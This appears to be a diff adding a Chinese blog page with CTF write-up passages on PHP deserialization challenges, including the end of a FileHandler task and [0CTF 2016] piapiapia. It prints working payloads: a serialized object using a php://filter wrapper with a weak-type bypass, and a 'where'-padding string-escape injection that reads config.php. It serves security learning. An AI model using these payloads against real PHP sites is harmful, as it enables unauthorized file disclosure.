+    private function write() {
+        if(isset($this-&gt;filename) &amp;&amp; isset($this-&gt;content)) {
+            if(strlen((string)$this-&gt;content) &gt; 100) {
+                $this-&gt;output(&quot;Too long!&quot;);
+                die();
+            }
+            $res = file_put_contents($this-&gt;filename, $this-&gt;content);
+            if($res) $this-&gt;output(&quot;Successful!&quot;);
+            else $this-&gt;output(&quot;Failed!&quot;);
+        } else {
+            $this-&gt;output(&quot;Failed!&quot;);
+        }
+    }
+
+    private function read() {
+        $res = &quot;&quot;;
+        if(isset($this-&gt;filename)) {
+            $res = file_get_contents($this-&gt;filename);
+        }
+        return $res;
+    }
+
+    private function output($s) {
+        echo &quot;[Result]: &lt;br&gt;&quot;;
+        echo $s;
+    }
+
+    function __destruct() {
+        if($this-&gt;op === &quot;2&quot;)
+            $this-&gt;op = &quot;1&quot;;
+        $this-&gt;content = &quot;&quot;;
+        $this-&gt;process();
+    }
+
+}
+
+function is_valid($s) {
+    for($i = 0; $i &lt; strlen($s); $i++)
+        if(!(ord($s[$i]) &gt;= 32 &amp;&amp; ord($s[$i]) &lt;= 125))
+            return false;
+    return true;
+}
+
+if(isset($_GET{&#39;str&#39;})) {
+
+    $str = (string)$_GET[&#39;str&#39;];
+    if(is_valid($str)) {
+        $obj = unserialize($str);
+    }
+
+}</code></pre>
+<p>记录一下这个题的三个点，由于类中的三个变量是<code>protected</code>的，所以序列化的时候会出现不可见字符，但是由于php&gt;7.1的版本对类属性的检测不严格(对属性类型不敏感)，因此可以直接构造（此题目版本就&gt;7.1），另一个点就是源代码中反序列化进入到<code>__destruct()</code>中的比较是强类型比较，但<code>process()</code>中是弱类型比较，因此可以用弱类型绕过。</p>
+<pre><code class="php">php &gt; var_dump(2===&#39;2&#39;);
+bool(false)</code></pre>
+<p><img src="https://i.loli.net/2020/08/13/X4SUYhbxOlzIrK3.png" alt="image-20200813194456848"></p>
+<p>但是由于某种原因，index.php可以直接读出来，但是flag.php不能直接读，使用filter伪协议后就可以了，但是在本地的windows又出现问题了，前边两种情况都不行，添加绝对路径才能读出来，总之伪协议+绝对路径一定能读出来。</p>
+<p>绝对路径可能在<code>/proc/self/cmdline</code>中找到。</p>
+<p>因此一个可行的payload如下：</p>
+<pre><code class="php">?str=O:11:&quot;FileHandler&quot;:3:{s:2:&quot;op&quot;;i:2;s:8:&quot;filename&quot;;s:52:&quot;php://filter/convert.base64-encode/resource=flag.php&quot;;s:7:&quot;content&quot;;N;}</code></pre>
+<p>同时根据p神的解释</p>
+<p><img src="https://i.loli.net/2020/08/13/mB2a5GOv7dhNlYR.png" alt="img"></p>
+<pre><code class="php">?str=O:11:&quot;FileHandler&quot;:3:{S:5:&quot;\00*\00op&quot;;i:2;S:11:&quot;\00*\00filename&quot;;S:52:&quot;php://filter/convert.base64-encode/resource=flag.php&quot;;S:10:&quot;\00*\00content&quot;;N;}</code></pre>
+<p>这样也可。</p>
+<h3 id="0CTF-2016-piapiapia"><a href="#0CTF-2016-piapiapia" class="headerlink" title="[0CTF 2016]piapiapia"></a>[0CTF 2016]piapiapia</h3><p>这道题在我看来简直精妙，因为自己太菜想不出哪儿可以利用，看完wp后才恍然大悟，因此好好写一写这个思路。</p>
+<p>打开是一个登录界面，本来还以为是一个sql注入，但是试了老半天发现回显除了 Invild就是Invild。也没什么别的提示，一般来说应该就有源码泄露了，试了一下<a href="http://www.zip果然有源码，" target="_blank" rel="noopener">www.zip果然有源码，</a></p>
+<p>代码逻辑大概就是通过SESSION判断是否登录，然后通过登录名进行上传操作。然后有一个用户注册页面，</p>
+<p><img src="https://i.loli.net/2020/08/15/fcXdSODzBWqYkpo.png" alt="image-20200815160724332"></p>
+<p>看了一下代码，大概能利用的点就在<code>profile.php</code>的这个文件包含这里。而profile这个数组里的值是从<code>update.php</code>里序列化的。</p>
+<p><img src="https://i.loli.net/2020/08/15/1v9Twc8uzdJpq5L.png" alt="image-20200815160850654"></p>
+<p><code>update.php</code>里的内容，就把输入的信息按数组的方式序列化，然后可以在<code>profile.php</code>读到相关内容以及你上传的图片。</p>
+<p><img src="https://i.loli.net/2020/08/15/8lFpZ65KRrIfO1o.png" alt="image-20200815161544484"></p>
+<p>正常来说序列化以及反序列化的过程是这样的</p>
+<p><img src="https://i.loli.net/2020/08/15/VWZ3lOkqia2RBYv.png" alt="image-20200815162348255"></p>
+<p>但是如果能控制序列化的内容，大概类似这样，那么即可进行文件读取了(顺便提一下本题的flag在<code>config.php</code>里)</p>
+<pre><code>$a=&quot;a:4:{s:5:\&quot;phone\&quot;;s:9:\&quot;123456789\&quot;;s:5:\&quot;email\&quot;;s:16:\&quot;123456789@qq.com\&quot;;s:8:\&quot;nickname\&quot;;s:5:\&quot;iluem\&quot;;s:5:\&quot;photo\&quot;;s:10:\&quot;config.php\&quot;;}s:39:\&quot;upload/f3ccdd27d2000e3f9255a7e3e2c48800\&quot;;}&quot;;</code></pre><p>那么结果就会</p>
+<p><img src="https://i.loli.net/2020/08/15/9ga2UyKQnBPW8FH.png" alt="image-20200815162634486"></p>
+<p>很显然我们对photo里的值似乎不能达到这样效果，但nickname和photo是紧挨着的两个键名，因此可以尝试对nickname进行操作，但是看到这里发现有好几个过滤，首先是<code>update.php</code>里的过滤</p>
+<pre><code class="php">#update.php
+if(preg_match(&#39;/[^a-zA-Z0-9_]/&#39;, $_POST[&#39;nickname&#39;]) || strlen($_POST[&#39;nickname&#39;]) &gt; 10)
+            die(&#39;Invalid nickname&#39;);
+            ·······
+$user-&gt;update_profile($username, serialize($profile));</code></pre>
+<p>同时在进行进行user类操作的时候也有过滤</p>
+<pre><code class="php">#class.php    
+public function update_profile($username, $new_profile) {
+        $username = parent::filter($username);
+        $new_profile = parent::filter($new_profile);
+
+        $where = &quot;username = &#39;$username&#39;&quot;;
+        return parent::update($this-&gt;table, &#39;profile&#39;, $new_profile, $where);
+    }
+#parent
+public function filter($string) {
+        $escape = array(&#39;\&#39;&#39;, &#39;\\\\&#39;);
+        $escape = &#39;/&#39; . implode(&#39;|&#39;, $escape) . &#39;/&#39;;
+        $string = preg_replace($escape, &#39;_&#39;, $string);
+
+        $safe = array(&#39;select&#39;, &#39;insert&#39;, &#39;update&#39;, &#39;delete&#39;, &#39;where&#39;);
+        $safe = &#39;/&#39; . implode(&#39;|&#39;, $safe) . &#39;/i&#39;;
+        return preg_replace($safe, &#39;hacker&#39;, $string);
+    }</code></pre>
+<p>前者的过滤可以通过数组<code>username[]=</code>的形式绕过，后者这个过滤呢，其实也正是我们能够利用的点，因为反序列化的时候会根据键值的长度进行匹配，</p>
+<pre><code>a:4:{s:5:&quot;phone&quot;;s:9:&quot;123456789&quot;;s:5:&quot;email&quot;;s:16:&quot;123456789@qq.com&quot;;s:8:&quot;nickname&quot;;a:1:{i:0;s:5:&quot;iluem&quot;;}s:5:&quot;photo&quot;;s:39:&quot;upload/f3ccdd27d2000e3f9255a7e3e2c48800&quot;;}</code></pre><p>大概是 phone 前边的 5 代表phone的长度这个意思。</p>
+<p>我们想要达到的效果就是将s后边的字符长度改成我们想要的长度达到提前闭合反序列化的字符串的目的，</p>
+<p>我们在nickname后边要添加的字符串大概是这些</p>
+<pre><code>iluem&quot;;}s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;}</code></pre><p>但是这会让nickname的长度增加34</p>
+<p>如果没有边这个将匹配到的字符替换为hacker，似乎真的没什么别的好方法。</p>
+<p>用于过滤的字符只有<code>where</code>与<code>hacker</code>长度不同，又因序列化的操作在过滤之前。如果username中有<code>where</code>被替换成<code>hacker</code>，那么反序列化时的匹配username时就会提前结束1字符，要是我们加上34个<code>where</code>让它提前34个字符结束，那么匹配到的就是</p>
+<p><code>iluem</code>后边我们对photo进行的操作就逃逸出来了。因此我们可以构造</p>
+<pre><code>username[]=wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere&quot;;}s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;}</code></pre><p>然后传上去就可以在profile页面拿到<code>config.php</code>的<code>base64encode</code>了。</p>
+
+    </div>
+  </div>
+  
+  
+  
+
+  
+
+  <div class="article-footer">
+    <div class="article-meta pull-left">
+      <span>
+        
+          <i class="iconfont icon-06tags"></i>标签: 
+          
+          <span class="span--tag">
+            <a href="/tags/CTF/">
+              #CTF
+            </a>
+          </span>
+          
+        
+      </span>
+    </div>
+    <div class="article-meta pull-right">
+    </div>
+  </div>
+</div>
+
+
+  <aside id="sidebar">
+    <p id="sidebar-header"></p>
+    <ol id="sidebar-toc"></ol>
+  </aside>
+  <script async>setTimeout(generateToc, 10);</script>
+
+
+  <nav class="post-navigation">
+    
+      <div class="nav-pre">
+        <i class="iconfont icon-prev"></i>
+        上一篇:
+        <a href="/passagessqli-labs/" target="_self">sqli-labs</a>
+      </div>
+    
+    
+  </nav>
+
+  
+    <a href="#comment" class="comment-anchor"></a>
+<div class="comment-title"><i class="iconfont icon-footprint"></i> 留下足迹 <i class="iconfont icon-footprint"></i></div>
+<div id="vcomments"></div>
+
+<script defer>
+  if( true ) {
+    let path = getRealPath()
+    new Valine({
+      el: "#vcomments",
+      appId: "0uSharGIGNO1brdWwOsU0Tf7-gzGzoHsz",
+      appKey: "sivgWCRfGcA6BX905S8dIz1E",
+      notify: false,
+      verify: false,
+      avatar: "robohash",
+      placeholder: "正确填写邮箱, 才能及时收到回复哦♪(^∇^*)",
+      path
+    });
+  }
+</script>
+   
+
+  
+    <script defer>
+const valineAPI = (() => {
+  try {
+    AV.init("0uSharGIGNO1brdWwOsU0Tf7-gzGzoHsz", "sivgWCRfGcA6BX905S8dIz1E");
+  } catch(error) {}
+  const isExist = (identity) => {
+    identity = identity || getRealPath();
+    let query = new AV.Query('Timer');
+    return new Promise((resolve, reject) => {
+      query.equalTo("identity", identity);
+      query.find().then(results => {
+        resolve(results.length > 0);
+      }, error => reject(error));
+    })
+  }
+
+  const _get = (identity) => {
+    let query = null;
+    if(identity && identity instanceof Array){
+      let querys = [];
+      for(let i = 0; i < identity.length; ++i) {
+        querys[i] = new AV.Query('Timer');
+        querys[i].equalTo('identity', identity[i]);
+      }
+      query = AV.Query.or.apply(null ,querys);
+    } else {
+      identity = identity || getRealPath();
+      query = new AV.Query("Timer");
+      query.equalTo("identity", identity);
+    }
+
+    return new Promise((resolve, reject) => {
+      query.find()
+      .then(results => resolve(results))
+      .catch(error => reject(error))
+    })
+  }
+
+  const create = (identity) => {
+    identity = identity || getRealPath();
+    return new Promise((resolve, reject) => {
+      let Todo = AV.Object.extend('Timer');
+      let todo = new Todo();
+      todo.set("times", 1);
+      todo.set("identity", identity);
+      todo.save().then(res => resolve(true), error => reject(error));
+    })
+  }
+
+  const update = (identity) => {
+    identity = identity || getRealPath();
+    return new Promise((resolve, reject) => {
+      let query = new AV.Query('Timer');
+      query.equalTo("identity", identity);
+      query.find().then(todos => {
+        todos.forEach(todo => {
+          todo.set("times", todo.attributes.times + 1);
+        });
+        return AV.Object.saveAll(todos);
+      }).then(todos => resolve(true), error => reject(error));
+    })
+  }
+
+  return {
+    isExist,
+    _get,
+    update,
+    create
+  }
+})()
+
+const calcAndWriteTimes = () => {
+  let isPost = true;
+
+  let timerAllDOM = document.querySelectorAll(".article-timer");
+
+  if(isPost) {
+    let identity = timerAllDOM[0].getAttribute("data-identity");
+    valineAPI.isExist(identity)
+    .then(exist => {
+      if(exist) {
+        return valineAPI.update(identity);
+      }
+      return new Promise(resolve => resolve(true));
+    })
+    .then( succuess => valineAPI._get(identity))
+    .then( result => timerAllDOM[0].innerText = result[0].attributes.times)
+    .catch(error => console.log(error.message))
+    return ;
+  }
+
+  let timerDOMCache = {};
+
+  for(let timerDOM of timerAllDOM) {
+    let identity = timerDOM.getAttribute("data-identity");
+    if(timerDOMCache.hasOwnProperty(identity)){
+      timerDOMCache[identity].dom.push(timerDOM);
+    }else{
+      timerDOMCache[identity] = {
+        dom: [timerDOM],
+        times: undefined
+      };
+    }
+  }
+
+  let identities = Object.keys(timerDOMCache);
+  valineAPI._get(identities).then(results => {
+    for(let result of results) {
+      let {identity, times} = result.attributes;
+      timerDOMCache[identity].times = times;
+      timerDOMCache[identity].dom.map(item => item.innerText = times);
+    }
+    for(let identity of identities) {
+      if(timerDOMCache[identity].times){
+        continue;
+      }
+      timerDOMCache[identity].dom.map(item => item.innerText = 1);
+      valineAPI.create(identity);
+    }
+  }).catch(error => console.log(error.message))
+}
+
+if(true){
+  calcAndWriteTimes();
+}
+</script>
+   
+
+</div>
+
+
+      <footer>
+  <p class="site-info">
+    博客已萌萌哒运行<span id="time-to-now"></span><span class="my-face">(●'◡'●)ﾉ♥</span>
+    <br>
+    Theme - <a href="https://github.com/dongyuanxin/theme-bmw" target="_blank" rel="noopener">BMW</a> | Made With 💗 | Powered by <a href="https://godbmw.com/" target="_blank" rel="noopener">GodBMW</a>
+    <br>
+    
+  </p>
+</footer>
+
+
+
+<script>
+const timeToNowDOM = document.querySelector("#time-to-now");
+const startTimestamp = new Date(2020, 5, 8).getTime();
+
+const updateTimeStr = () => {
+  let offset = parseInt(
+      (new Date().getTime() - startTimestamp) / 1000,
+      10
+    ),
+    day = Math.floor(offset / 86400),
+    hour = Math.floor((offset % 86400) / 3600),
+    minute = Math.floor(((offset % 86400) % 3600) / 60),
+    second = Math.floor(((offset % 86400) % 3600) % 60);
+  timeToNowDOM.innerHTML =
+    day + "天" + hour + "小时" + minute + "分钟" + second + "秒";
+  setTimeout(updateTimeStr, 500);
+}
+
+setTimeout(updateTimeStr, 500);
+</script>
+
+
+      <div class="back-to-top hidden">
+  <span>
+    <i class="iconfont icon-60"></i><span></span>%
+  </span>
+</div>
+
+<script>
+const updateIconToTop = percent => {
+  let dom = document.querySelector(".back-to-top span span");
+  dom.innerText = percent;
+  if(percent < 1) {
+    document.querySelector(".back-to-top").className = "back-to-top hidden";
+  } else {
+    document.querySelector(".back-to-top").className = "back-to-top";
+  }
+}
+
+const handleScoll = () => {
+  let isRunning = false;
+  return () => {
+    if (isRunning) return;
+    isRunning = true;
+    window.requestAnimationFrame(timestamp => {
+      let scrollTop =
+          document.documentElement.scrollTop || document.body.scrollTop,
+        scrollHeight =
+          document.documentElement.scrollHeight ||
+          document.body.scrollHeight,
+        clientHeight =
+          document.documentElement.clientHeight ||
+          document.body.clientHeight;
+      isRunning = false;
+      if (scrollTop <= 1) {
+        updateIconToTop(0);
+        return;
+      }
+      if (scrollTop + clientHeight >= scrollHeight) {
+        updateIconToTop(100);
+      } else {
+        updateIconToTop(parseInt(
+          100 * scrollTop / (scrollHeight - clientHeight),
+          10
+        ));
+      }
+    });
+  };
+}
+
+const backToTop = () => {
+  let scrollTop =
+      document.documentElement.scrollTop || document.body.scrollTop,
+    delay = 10,
+    time = 200;
+  if (scrollTop <= 20) {
+    document.documentElement.scrollTop = 0;
+    document.body.scrollTop = 0;
+    return;
+  }
+  let step = Math.ceil(scrollTop * delay / time);
+  let timer = setInterval(() => {
+    scrollTop =
+      document.documentElement.scrollTop || document.body.scrollTop;
+    if (scrollTop - step <= 0) {
+      document.documentElement.scrollTop = 0;
+      document.body.scrollTop = 0;
+      clearInterval(timer);
+    } else {
+      document.documentElement.scrollTop = scrollTop - step;
+      document.body.scrollTop = scrollTop - step;
+    }
+  }, delay);
+}
+
+document.addEventListener("scroll", handleScoll(), false);
+
+document.querySelector(".back-to-top").addEventListener("click", backToTop, false);
+
+</script>
+
+    </div>
+
+    
+      <script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-MML-AM_CHTML" async></script>
+<script>
+  (() => {
+    const mathjaxConfig = {
+      showProcessingMessages: false, //关闭js加载过程信息
+      messageStyle: "none", //不显示信息
+      jax: ["input/TeX", "output/HTML-CSS"],
+      tex2jax: {
+        inlineMath: [["$", "$"], ["\\(", "\\)"]], //行内公式选择符
+        displayMath: [["$$", "$$"], ["\\[", "\\]"]], //段内公式选择符
+        skipTags: ["script", "noscript", "style", "textarea", "pre", "code", "a"] //避开某些标签
+      },
+      "HTML-CSS": {
+        availableFonts: ["STIX", "TeX"], //可选字体
+        showMathMenu: false //关闭右击菜单显示
+      }
+    }
+
+    let mathjaxInterval = setInterval(() => {
+      if(!window.MathJax){
+        return;
+      }
+      window.MathJax.Hub.Config(mathjaxConfig)
+      window.MathJax.Hub.Queue(["Typeset", MathJax.Hub, document.getElementById('app')])
+
+      clearInterval(mathjaxInterval)
+    }, 10)    
+  })()
+</script>
+    
+
+    <script src="https://cdn.bootcss.com/fancybox/3.5.2/jquery.fancybox.min.js" async></script>
+<script async>
+  let fancyTimer = setInterval(function(){
+    if(!window.$){
+      return;
+    }
+    $(document).ready(function() {
+      $(".post img").each(function () {
+        if($(this).parent().get(0).tagName.toLowerCase() === "a") {
+          return;
+        }
+        // $(this).attr("data-fancybox", "gallery"); // if you add 'data-fancybox', img will display after showed
+        var element = document.createElement("a");
+        $(element).attr("data-fancybox", "gallery");
+        $(element).attr("href", $(this).attr("src"));
+        $(this).wrap(element);
+      });
+      
+      clearInterval(fancyTimer);
+    });
+  }, 10);
+</script>
+
+    
+
+
+
+  </body>
+  
+  
+  <!-- 页面点击小红心 -->
+<script type="text/javascript" src="/js/love.js"></script>
+
+
+
+</html>
